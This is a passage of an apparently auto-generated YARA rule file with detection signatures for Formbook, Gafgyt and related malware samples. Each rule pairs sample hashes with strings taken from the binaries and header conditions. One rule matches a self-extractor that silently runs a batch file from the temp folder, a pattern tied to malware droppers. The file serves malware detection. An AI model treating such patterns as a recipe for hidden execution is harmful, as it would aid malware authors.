      $s14 = "Update Table_Patients set PatientFirstName=@p1,PatientSurName=@p2,PatientTC=@p3,PatientPhone=@p4,PatientPassword=@p5,PatientGend" wide /* score: '12.00'*/
      $s15 = "INSERT INTO Table_Patients(PatientFirstName,PatientSurname,PatientTC,PatientPhone,PatientPassword,PatientGender) VALUES (@p1,@p2" wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__Ga_gyt_signature__003ce48e_Ga_gyt_signature__02ade22e_Ga_gyt_signature__08e57706_Ga_gyt_signature__099bbc_21 {
   meta:
      description = "_subset_batch - from files Ga-gyt(signature).elf, Ga-gyt(signature)_003ce48e.elf, Ga-gyt(signature)_02ade22e.elf, Ga-gyt(signature)_08e57706.elf, Ga-gyt(signature)_099bbc70.elf, Ga-gyt(signature)_115d4aff.elf, Ga-gyt(signature)_117f7d25.elf, Ga-gyt(signature)_12fa90d4.elf, Ga-gyt(signature)_16a7a3e5.elf, Ga-gyt(signature)_1853d066.elf, Ga-gyt(signature)_194f49f6.elf, Ga-gyt(signature)_1a3223d2.elf, Ga-gyt(signature)_1a972aef.elf, Ga-gyt(signature)_2336f3c8.elf, Ga-gyt(signature)_2b8ef56e.elf, Ga-gyt(signature)_3155e4a1.elf, Ga-gyt(signature)_33fed557.elf, Ga-gyt(signature)_36dfa7be.elf, Ga-gyt(signature)_38cb8145.elf, Ga-gyt(signature)_3b558993.elf, Ga-gyt(signature)_3c851073.elf, Ga-gyt(signature)_4238ee25.elf, Ga-gyt(signature)_431eaf4e.elf, Ga-gyt(signature)_47196d36.elf, Ga-gyt(signature)_4a7a3889.elf, Ga-gyt(signature)_4e6797d7.elf, Ga-gyt(signature)_4eac2012.elf, Ga-gyt(signature)_5529cd73.elf, Ga-gyt(signature)_594dbcd5.elf, Ga-gyt(signature)_5a818e1d.elf, Ga-gyt(signature)_5bb6b335.elf, Ga-gyt(signature)_6346480b.elf, Ga-gyt(signature)_649c634a.elf, Ga-gyt(signature)_6688e577.elf, Ga-gyt(signature)_67a4f92e.elf, Ga-gyt(signature)_684668d3.elf, Ga-gyt(signature)_6a4c3ee6.elf, Ga-gyt(signature)_6dffbd5b.elf, Ga-gyt(signature)_70b5e54a.elf, Ga-gyt(signature)_729fdb58.elf, Ga-gyt(signature)_76960ae3.elf, Ga-gyt(signature)_774cf5e1.elf, Ga-gyt(signature)_790d635b.elf, Ga-gyt(signature)_798ef557.elf, Ga-gyt(signature)_7b70b2c1.elf, Ga-gyt(signature)_8221530c.elf, Ga-gyt(signature)_8bc3acd0.elf, Ga-gyt(signature)_8da6474c.elf, Ga-gyt(signature)_8edf7088.elf, Ga-gyt(signature)_8f58389a.elf, Ga-gyt(signature)_962c7912.elf, Ga-gyt(signature)_995e632e.elf, Ga-gyt(signature)_9d764713.elf, Ga-gyt(signature)_9ffcd7e8.elf, Ga-gyt(signature)_a0d8e4ce.elf, Ga-gyt(signature)_a0dbcdaf.elf, Ga-gyt(signature)_a33aa07b.elf, Ga-gyt(signature)_a8176ff5.elf, Ga-gyt(signature)_b2d1c40a.elf, Ga-gyt(signature)_b7bf4fe7.elf, Ga-gyt(signature)_b9bee2ff.elf, Ga-gyt(signature)_ba8cefa1.elf, Ga-gyt(signature)_bcc239c8.elf, Ga-gyt(signature)_bfd53fb7.elf, Ga-gyt(signature)_c0cdd140.elf, Ga-gyt(signature)_c1083f40.elf, Ga-gyt(signature)_c5242cba.elf, Ga-gyt(signature)_c67b0e5d.elf, Ga-gyt(signature)_c94a6da1.elf, Ga-gyt(signature)_c9d27f1a.elf, Ga-gyt(signature)_ca35fb33.elf, Ga-gyt(signature)_cf9a897f.elf, Ga-gyt(signature)_d06bbde6.elf, Ga-gyt(signature)_d3a381e7.elf, Ga-gyt(signature)_d43c5188.elf, Ga-gyt(signature)_d92a82bd.elf, Ga-gyt(signature)_d93fb941.elf, Ga-gyt(signature)_deada87f.elf, Ga-gyt(signature)_e000bf78.elf, Ga-gyt(signature)_e4393a49.elf, Ga-gyt(signature)_e5db6f05.elf, Ga-gyt(signature)_e6e0d533.elf, Ga-gyt(signature)_e8560f2d.elf, Ga-gyt(signature)_ecea5593.elf, Ga-gyt(signature)_edcdc550.elf, Ga-gyt(signature)_eec3dcaa.elf, Ga-gyt(signature)_ef3f0872.elf, Ga-gyt(signature)_f0fb5d22.elf, Ga-gyt(signature)_f1913c15.elf, Ga-gyt(signature)_f352b540.elf, Ga-gyt(signature)_fba645a0.elf, Ga-gyt(signature)_fded76da.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "badbdf9d6e147862f9bccb34ad624a5aa705aebb05306687560f1dc699a87d50"
      hash2 = "003ce48e01614fa49fbf7197243d32349c0eab85190798cc2131a6f22f9e4d74"
      hash3 = "02ade22e5b0a69704aa9862d491a866dd0b9974fbc54b9e5f920d84db5a9e2af"
      hash4 = "08e57706eef9830325e1f3297a5a44fd84675bbdc524981611f20326903196cf"
      hash5 = "099bbc70566f0d047619264f78d26896c8caa1ee5ca0cb1d544dd4b2730a0d75"
      hash6 = "115d4aff6a22cff42f92f93b93dbc490a3faff85d6c0ed0b3cfac39f05473742"
      hash7 = "117f7d25832f1f174e0bba6dd3df98b3762d7bf7c33f9d952e677a7688d0821e"
      hash8 = "12fa90d48c61f2a5940d47ddeb4067351bdee5b1747f94f478795464a5e628f6"
      hash9 = "16a7a3e51caabdbeca5361fb618c88b336d6a6eef90844a1a4e667f3b55dd9e1"
      hash10 = "1853d06635409f80f521fe8bf5dca9f67356cc84eb805a0165fca20d991ce0b8"
      hash11 = "194f49f641ea7d3f29bbba944c4a72339f036bdea1614a40ac50e054abc5fc46"
      hash12 = "1a3223d26333af7e0ebe2dc78e948bb3c8b26baec7948e4a013de683d0d9dea7"
      hash13 = "1a972aef3200cb58f59220663ac87dcaf1866a1a6486384a0ea5028a306444a2"
      hash14 = "2336f3c8f91e10815d4da62e26d9f7ed9a54e751ef83cac91152a1183d8d4633"
      hash15 = "2b8ef56eb884414f3afcbbb720032bc4ce2d62b7be8ab8ad6362cd900f898c13"
      hash16 = "3155e4a1447667f0ec7f1d6818d6b9356d79388f5532a983565a0de491a19e1e"
      hash17 = "33fed5577c6434b83317ccac7236bddb015308e7eb2594078cf67ff9cc5e448f"
      hash18 = "36dfa7beb65e6afab7d250b19421674650c47df13c7cfe1d60f8f8b2d4da12b2"
      hash19 = "38cb814572e19263ba562b6b88820b01d3e72fc5e1a26063be5b7677e855f388"
      hash20 = "3b5589935c96cc268c4ada75eaa2402eea660584ea4da5597142f07afdcc4a57"
      hash21 = "3c851073c27a32d4b0442c4ab91226872d6c8874bd8ef9720a0d35da17547ebb"
      hash22 = "4238ee2586dea220c2d955dc854f60a3562753cab1c39f5581464cd0c94bd7e9"
      hash23 = "431eaf4e92104050175506be59bff461c2fb7f8a134c7328b932fea657db0f34"
      hash24 = "47196d36b4afcb3d207b77b14b007e962d1d11410b888b261061a77e08c45838"
      hash25 = "4a7a38894b2e0194235b993a2aa9d2eccc3bcca5a061e1708c552d59aab16807"
      hash26 = "4e6797d71a63a3bb2a6b5bf80ace0324997a43ecc0e492d07d526c2e909e218d"
      hash27 = "4eac2012cc32fd0d6543ee29f68c01081b08911bcd9af23364e9c4b73b76f303"
      hash28 = "5529cd730747b493345c564cf5398d5c7333f83dcd5a84eac99475781dfc5025"
      hash29 = "594dbcd51c2c9eb879668bcc58a364d6951319c532cda3947747a495e41a9942"
      hash30 = "5a818e1dd92c79d1b995e22a6d43cce55680054e28c96b5cc43a3b8f80b82a83"
      hash31 = "5bb6b335d5df8e953dafe382ef810d5629fa15f959655c1fcbe2af815ad4bb13"
      hash32 = "6346480bafd6705e0da22bced4326767c7dde231c040560dc2789736d9f3ea4a"
      hash33 = "649c634a55d1e38445530e627273d38c7ac5e4f7b5fdc121641779cff5df8784"
      hash34 = "6688e577ce161173f64535063dd402a3942f8ed15e5ec7615f2a6c1da8960d80"
      hash35 = "67a4f92e690aec804a0a96b61662d843c2d71215589e16769bf95d4b754c7c21"
      hash36 = "684668d3065daad253570100f3b947a50aad9be3e4429d02c156176899e23e60"
      hash37 = "6a4c3ee666b2242fecdac3853bebaad56f3af0c59130e0d344ede095c271b805"
      hash38 = "6dffbd5bad3dbd72e83e313e7d654a880df9552030d6c03a877b76adc2bb58e8"
      hash39 = "70b5e54a1c92223360c751e66d3190ba506f02c9a6a6e65c23b13a44c096e4c7"
      hash40 = "729fdb587dd9b93b8d689209d68b2ef32678cb3263177d79e443046fb278c93c"
      hash41 = "76960ae368400523aef607ef18857a9d669d4980e637c5fe8e3c1715bc08ad23"
      hash42 = "774cf5e15f9ed4377498d34d32cf4383282b133e64106037674d49717d92db8a"
      hash43 = "790d635b5fd44dfe404782b4b763629b3c73078cb29c73037ff6747b5c87828b"
      hash44 = "798ef557e11959c89999bcfbbfb0dbbbfdb1413040b209e0ac097a083d000b68"
      hash45 = "7b70b2c10b6b18b69909ee1a4ca2feba898a9674fadcd82a5bf14c252778d00b"
      hash46 = "8221530c2fa6e83e4b3b41f47e9af9c24f48aa8297bd046d480de895e02de304"
      hash47 = "8bc3acd0a436ba14ae9a575d2c248be46a023a8efa987404b26ba5ae55fa5400"
      hash48 = "8da6474cc31eddd180e1436dffa02880f44d024890967ee61ec12b6dd9485cea"
      hash49 = "8edf7088424c71a87121b3dcad1b45982ebd3937f9ceb27e5bdde81b6c708cc9"
      hash50 = "8f58389ab90d9b8e9aed7c3d13f6bc637db07bfa7ac2c5f42a4ae61b7f4eade7"
      hash51 = "962c7912c44af279cd7879402913ca17968a64788b041b855867d42bf0441387"
      hash52 = "995e632e29a9c2635cfc9f693950e3ad07ae18028968e1427b306bb72e573a00"
      hash53 = "9d76471330bf15ebac2085e9fc3a82a23b879b3e2fa1c3734397fc3a3ae65570"
      hash54 = "9ffcd7e81efcaaaab5a8f82b02bdf3b48b92de195fef1fe47c98da3b9d551a86"
      hash55 = "a0d8e4cedcfa4699da078f08285d181218a4ad62272508171c4d72a0f994151b"
      hash56 = "a0dbcdafb9b9e0bf04112477df4dc4a33bd9503c9249772ce22b3aaa0d228236"
      hash57 = "a33aa07b8f51e7bfee450b08b563fb72d93834f9955ad189795a49532f3cce97"
      hash58 = "a8176ff5b5cff316b8275642dd46966a19d7fc58603d91dbc6da7753fd8d9414"
      hash59 = "b2d1c40abefa7de9c98063e264b1a72e6d31446a01235db92d3ab557f095acdf"
      hash60 = "b7bf4fe7f4609b3d01307de7807d5cbd52b053f58574fc4a46d3337cea27d9aa"
      hash61 = "b9bee2ff45aaa40cf2068f9a04648fbad7f35619b0a803a7de0926fcd7542a07"
      hash62 = "ba8cefa13974bc2d0c7dae716386c4f64f2e91a86c60807ac6fe3a4efa625751"
      hash63 = "bcc239c8ac93b5b198fd4c5be8da9a252ef9149fcc3c13986d364826a9c8d900"
      hash64 = "bfd53fb7889c2aea371009ceca59013268ca8179e9e1c5fe67a8f730d57e8fe7"
      hash65 = "c0cdd140b08ca6e8fd2ca805a1e745d9ca74b1b15b1d1f604b524b9f98e225f5"
      hash66 = "c1083f406437651d99f4b0a6fdbb3dc57f7268fc3c1f071b8330007ca9f36de6"
      hash67 = "c5242cbaba6987811e70eb8a9ef4ed15c0b4771245e0d46d09c9b32d3ae1ede3"
      hash68 = "c67b0e5db2fde7944d76704de31bc1f869dc0d93e0824a468b1fbcaab69604f5"
      hash69 = "c94a6da1e05a9fb1f059241b44f1904f2cd454c4130921f6156584dc9840f6c4"
      hash70 = "c9d27f1afa200613296f2ed4267e05564e54d74dadf433a51bb82ca3a79325cb"
      hash71 = "ca35fb33cf053bbb05c7d28dca4881130aa4d736178dcecb73edf540ba537988"
      hash72 = "cf9a897fadec97206fe1f75f6978a04c333d37ac418fc1525bcabe3f13f225a0"
      hash73 = "d06bbde61018471ebd586072483c851cf05e4eca89d6345d2142c92a11aabd48"
      hash74 = "d3a381e7d3ab8913cbaa5b7727c938de321fc642ac14467862c7a8f4ba696639"
      hash75 = "d43c5188a2ddbf9cc46654dc006a1acbea5070591d3a7fa95cd36039fb660778"
      hash76 = "d92a82bd103c2270d823c70dc507b3068d7492b9497243a16a14e6e1134ddafc"
      hash77 = "d93fb9417b718ce39295f64663c367320f27c46a22c3ca71763de8658a038499"
      hash78 = "deada87f278eca7ecd0707ac4806b2332d5065e08ea23b8091ff3ec073cec6fc"
      hash79 = "e000bf782ceba891ac10495498237e7107729a4adce4b2f68d86fee7dbc7622a"
      hash80 = "e4393a49350ed5e410e1cf286c4b8b6df29224348c9972aadcded5cb74874fba"
      hash81 = "e5db6f054f62cbd5337cdd30b2edd6cc95bd79548ebd7eb80c6d81778c937947"
      hash82 = "e6e0d5334a6b305ecb60f563aa16cb5d47ffa420a03799c030ac51d3ab869ff3"
      hash83 = "e8560f2d4c0c827c22ebb50e0b4da6b88eb54a67405b617fb1ed217e7196e98c"
      hash84 = "ecea5593626f11818b105bbc990131332a0da5791ceb1e8b85e3b858bbff1641"
      hash85 = "edcdc550aec62acf39f6de4cf551f746a6909bcead293af6e88bfec0b622cd49"
      hash86 = "eec3dcaa2e4f96007a5f5cfbf4341d0796b6369bda8aea3c148b01a73ef12274"
      hash87 = "ef3f08722f6c51cb976d618d6709a9133d647a3cf92e614574cd855334265195"
      hash88 = "f0fb5d225ee6ae75855c8bbf27fe940c9bbf506a5d05f3c1323c305a067507d7"
      hash89 = "f1913c153d4e35e793415bf78d0935979b5fff160d9832a870793ca2b96fac17"
      hash90 = "f352b5403523eb0dc3a5f9bb07ba51bda6716ead0443a132b516a38611a3a0a9"
      hash91 = "fba645a024ac9b5c445a7753062271985a3be52a3ccd8d9bd3b56db81e1a4d5c"
      hash92 = "fded76da17f16ee2f6c9cdefbb11f7dae98e254a9bec1fe83f95ccdd93e2da15"
   strings:
      $s1 = "__pthread_mutex_init" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s3 = "__pthread_mutex_trylock" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s5 = "gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s6 = "__GI_gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s7 = "gethostbyname_r.c" fullword ascii /* score: '14.00'*/
      $s8 = "gethostbyname.c" fullword ascii /* score: '14.00'*/
      $s9 = "__GI_gethostbyname" fullword ascii /* score: '14.00'*/
      $s10 = "__get_hosts_byname_r" fullword ascii /* score: '14.00'*/
      $s11 = "get_hosts_byname_r.c" fullword ascii /* score: '14.00'*/
      $s12 = "read_etc_hosts_r.c" fullword ascii /* score: '12.00'*/
      $s13 = "__read_etc_hosts_r" fullword ascii /* score: '12.00'*/
      $s14 = "decoded.c" fullword ascii /* score: '11.00'*/
      $s15 = "__decode_header" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9108230e_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_22 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9108230e.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ecc21308.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9108230e6eccd1799be6b51d61acf64548711bdfb25c383813c1e1fa88c6165f"
      hash2 = "ecc21308ef77fa657384d6acd4bce4522fb58cb2797d1c8cf0e179f5cadf66b8"
   strings:
      $s1 = "C:\\Users\\User\\Documents" fullword ascii /* score: '24.00'*/
      $s2 = "comparison_report_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '20.00'*/
      $s3 = "<ProcessorCount>k__BackingField" fullword ascii /* score: '15.00'*/
      $s4 = "set_ProcessorCount" fullword ascii /* score: '15.00'*/
      $s5 = "Baseline [{0:yyyy-MM-dd HH:mm:ss}] - CPU: {1:F1}%, Memory: {2:F1}%, Disk: {3:F1}%, Network: {4:F1} Mbps" fullword wide /* score: '15.00'*/
      $s6 = "Processors: {0}" fullword wide /* score: '15.00'*/
      $s7 = "Win32_Processor.DeviceID='CPU0'" fullword wide /* score: '15.00'*/
      $s8 = "SELECT Name, MaxClockSpeed FROM Win32_Processor" fullword wide /* score: '15.00'*/
      $s9 = "Comparison Results (Baseline 2 - Baseline 1)" fullword wide /* score: '15.00'*/
      $s10 = "get_CpuUsage" fullword ascii /* score: '14.00'*/
      $s11 = "GetDiskUsage" fullword ascii /* score: '14.00'*/
      $s12 = "get_NetworkUsage" fullword ascii /* score: '14.00'*/
      $s13 = "GetMemoryUsageAlternative" fullword ascii /* score: '14.00'*/
      $s14 = "GetDiskUsageAlternative" fullword ascii /* score: '14.00'*/
      $s15 = "GetNetworkUsage" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _E_piro_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6_23 {
   meta:
      description = "_subset_batch - from files E-piro(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6fbc2876.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9112615b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00dac80841aec6a8e5e0a8df4b65f0dcc0f8272911bb89a575f74c40f2f3318f"
      hash2 = "6fbc2876f12bc1b00a57d7e7108ef5c12becf100b1a0f6dd4bdfad837052d966"
      hash3 = "9112615ba411d6052895da2d4a276289c21a36e2ae4ff93634d9d207f5e75427"
   strings:
      $s1 = "Ampersand '&' should be encoded as '&amp;'" fullword wide /* score: '16.00'*/
      $s2 = "Attribute syntax error - attributes should be in format: name=\"value\"" fullword wide /* score: '15.00'*/
      $s3 = "HTML_Validation_Errors.txt" fullword wide /* score: '14.00'*/
      $s4 = "get_SaveValidationReports" fullword ascii /* score: '12.00'*/
      $s5 = "get_HTMLVersion" fullword ascii /* score: '12.00'*/
      $s6 = "Line {0}: {1} - {2}" fullword wide /* score: '12.00'*/
      $s7 = "Help - HTML Validator" fullword wide /* score: '12.00'*/
      $s8 = "Empty Content" fullword wide /* score: '11.00'*/
      $s9 = "btnExportErrors_Click" fullword ascii /* score: '10.00'*/
      $s10 = "HTMLValidator.Forms.ValidationErrorsForm.resources" fullword ascii /* score: '10.00'*/
      $s11 = "btnExportErrors" fullword wide /* score: '10.00'*/
      $s12 = "Add alt=\"description\" to the image tag" fullword wide /* score: '10.00'*/
      $s13 = "Error reading file: " fullword wide /* score: '10.00'*/
      $s14 = "HTML Validation Errors Report" fullword wide /* score: '10.00'*/
      $s15 = "Errors exported successfully!" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8f217d94_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6628c702_F_24 {
   meta:
      description = "_subset_batch - from files f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8f217d94.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6628c702.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ada71baf.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b140ed87.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d248a0c9.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e97f62d8.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ef9ded41.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8f217d94322c29d45433f6a4d59fb09d2876a2b09bee3097b0047b7522a5df74"
      hash2 = "6628c702e59e0d00bfcc4cfb61bb661c20de0e99be4edbd63a4724d3cddf6b3b"
      hash3 = "ada71baf53aaee00fdd7839175e9f688dea0365cd09a500c68187d3565c2c1b0"
      hash4 = "b140ed87f2ba5d4ea5781adb9abeb567c743c2edfcb330d2fcd93f7a72eb5220"
      hash5 = "d248a0c9b30b0ae7ba91096d8106ca1b97b706a4d10e3921caeab6e9031bd565"
      hash6 = "e97f62d893c2f818f623482a0c8f35f32e9862a67cc479efdb5723ec75d1f6c0"
      hash7 = "ef9ded41b6e7c1bd265900b7fa7699b2346cbf95e99c1dcfb8ffd6557017ef5d"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADkF" fullword ascii /* score: '27.00'*/
      $s2 = "support@lotterysimulation.com" fullword wide /* score: '21.00'*/
      $s3 = "http://tempuri.org/DataSet1.xsd" fullword wide /* score: '17.00'*/
      $s4 = "https://github.com/lottery-simulation" fullword wide /* score: '17.00'*/
      $s5 = "Lottery Simulation - Main" fullword wide /* score: '12.00'*/
      $s6 = "columnHeaderLeastFreq" fullword ascii /* score: '9.00'*/
      $s7 = "columnHeaderTime" fullword ascii /* score: '9.00'*/
      $s8 = "get_AutoSaveHistory" fullword ascii /* score: '9.00'*/
      $s9 = "columnHeaderMostPercent" fullword ascii /* score: '9.00'*/
      $s10 = "columnHeaderLeastNumber" fullword ascii /* score: '9.00'*/
      $s11 = "columnHeaderMostFreq" fullword ascii /* score: '9.00'*/
      $s12 = "get_DefaultNumberCount" fullword ascii /* score: '9.00'*/
      $s13 = "columnHeaderSum" fullword ascii /* score: '9.00'*/
      $s14 = "get_PlaySounds" fullword ascii /* score: '9.00'*/
      $s15 = "columnHeaderSet" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__43cc343c_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_25 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_43cc343c.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8958957f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "43cc343c454ba7a27bebaa8ec011f8a202c34367b02e07320ef5e60c573be9bb"
      hash2 = "8958957f28d6d109287facfd2d9e537c35000b5cdae8418f976a5bf9070e1256"
   strings:
      $s1 = "get_ProcessedFiles" fullword ascii /* score: '20.00'*/
      $s2 = "<ProcessedFiles>k__BackingField" fullword ascii /* score: '15.00'*/
      $s3 = "set_ProcessedFiles" fullword ascii /* score: '15.00'*/
      $s4 = "{0:yyyy-MM-dd HH:mm} - {1} ({2} files)" fullword wide /* score: '15.00'*/
      $s5 = "get_CreateLogFile" fullword ascii /* score: '14.00'*/
      $s6 = "get_SkipSystemFiles" fullword ascii /* score: '12.00'*/
      $s7 = ".tmp,.log,.cache" fullword wide /* score: '12.00'*/
      $s8 = "backup_metadata.txt" fullword wide /* score: '11.00'*/
      $s9 = "Processing: ..." fullword wide /* score: '10.00'*/
      $s10 = "<GetBackupEntriesForSource>b__0" fullword ascii /* score: '9.00'*/
      $s11 = "get_TotalFilesCopied" fullword ascii /* score: '9.00'*/
      $s12 = "set_CreateLogFile" fullword ascii /* score: '9.00'*/
      $s13 = "<GetBackupStatistics>b__9_1" fullword ascii /* score: '9.00'*/
      $s14 = "<GetBackupEntry>b__0" fullword ascii /* score: '9.00'*/
      $s15 = "GetBackupEntry" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _f6baa5eaa8231d4fe8e922a2e6d240ea_imphash__f6baa5eaa8231d4fe8e922a2e6d240ea_imphash__2e430746_26 {
   meta:
      description = "_subset_batch - from files f6baa5eaa8231d4fe8e922a2e6d240ea(imphash).exe, f6baa5eaa8231d4fe8e922a2e6d240ea(imphash)_2e430746.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0d4119aeb554e97d7d2d384576c4209650f89a20d99b65a8c3269c996f41491e"
      hash2 = "2e43074695bc92c5ef642dd88a0b5e3c4239cfa7b98ecf6b129c6323f770edbc"
   strings:
      $x1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii /* score: '32.00'*/
      $s2 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii /* score: '29.00'*/
      $s3 = "RunProgram=\"%%P:hidcon:\\\"main.bat\\\" /S\"" fullword ascii /* score: '24.00'*/
      $s4 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s5 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s6 = "sfxelevation" fullword wide /* score: '20.00'*/
      $s7 = "PreExtract=\"%%P:hidcon:cmd /c \\\"\\\"%%T\\\\KillDuplicate.cmd\\\" \\\"%%T\\\" \\\"%%M\\\"\\\"\"" fullword ascii /* score: '16.00'*/
      $s8 = "YC.exe" fullword wide /* score: '16.00'*/
      $s9 = "Error in command line:" fullword ascii /* score: '15.00'*/
      $s10 = "InstallPath=\"%Temp%\\\\main\"" fullword ascii /* score: '15.00'*/
      $s11 = " 7-Zip - Copyright (c) 1999-2011 " fullword ascii /* score: '14.00'*/
      $s12 = "SFX module - Copyright (c) 2005-2012 Oleg Scherbakov" fullword ascii /* score: '14.00'*/
      $s13 = "7-Zip archiver - Copyright (c) 1999-2011 Igor Pavlov" fullword ascii /* score: '14.00'*/
      $s14 = " - Copyright (c) 2005-2012 " fullword ascii /* score: '14.00'*/
      $s15 = "7zSfxVarSystemPlatform" fullword wide /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "f6baa5eaa8231d4fe8e922a2e6d240ea" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bb41674d_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_27 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bb41674d.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e33dfc29.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e5c0d94c.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ea9a27a5.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fda6fb64.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bb41674ddf9e288e3bf546dae1c5961bf515876dfbd4f78e16bbff0a590cacec"
      hash2 = "e33dfc29e3a3d1e436ae244e934158aa3d47f58da62238e54d5c625f274a692e"
      hash3 = "e5c0d94c239bbf3aa57e92fd08403967b62ae2eaba19d1acc40400d4a1050cb0"
      hash4 = "ea9a27a55dfd58ccf9973c85b662c8cf3ba048e3f753c802640dc8718bde696c"
      hash5 = "fda6fb6494ea2dc893efdf8f2099aa9f24de56c0393de1714cba15ca2891227d"
   strings:
      $s1 = "Executable files (*.exe)|*.exe|Dynamic Link Libraries (*.dll)|*.dll|Icon files (*.ico)|*.ico|Shortcut files (*.lnk)|*.lnk|All fi" wide /* score: '28.00'*/
      $s2 = "Select an executable, DLL, icon, or shortcut file" fullword wide /* score: '17.00'*/
      $s3 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Go XMP SDK 1.0\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns" ascii /* score: '10.00'*/
      $s4 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Go XMP SDK 1.0\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns" ascii /* score: '10.00'*/
      $s5 = "Portable Network Graphic (*.png)|*.png|All Files (*.*)|*.*" fullword wide /* score: '10.00'*/
      $s6 = "OperatorButton_Click" fullword ascii /* score: '9.00'*/
      $s7 = "get_ShowBorderCheckBox_IsChecked" fullword ascii /* score: '9.00'*/
      $s8 = "get_PreviousSelectedSaveFilter" fullword ascii /* score: '9.00'*/
      $s9 = "get_PreviousSelectedOpenFilter" fullword ascii /* score: '9.00'*/
      $s10 = "get_PreviousFiles" fullword ascii /* score: '9.00'*/
      $s11 = "get_PreviousOpenFilePath" fullword ascii /* score: '9.00'*/
